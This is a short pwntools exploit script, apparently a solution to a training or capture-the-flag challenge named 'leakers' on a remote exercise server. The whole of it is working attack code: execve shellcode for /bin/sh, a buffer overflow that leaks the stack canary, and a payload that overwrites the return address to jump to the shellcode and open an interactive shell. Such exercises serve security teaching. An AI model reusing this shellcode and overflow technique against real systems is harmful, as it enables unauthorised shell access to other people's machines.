from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./leakers")
p = remote("training.jinblack.it", 2010)
#gdb.attach(p, '''b *0x0401200''')

raw_input("Wait")

shellcodeLenght = 27
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00\x00"

p.send(shellcode)
time.sleep(0.1)

p.send("B"*104 + "C")
time.sleep(0.1)
p.recvuntil("C")
canary = u64("\x00" + p.recv(7))

print "%#x" % canary

ps1Address = 0x404080

payload = "A"*104 + p64(canary) + "D"*8 + p64(ps1Address)
p.send(payload)
time.sleep(0.1)

p.send("\x00")

p.interactive()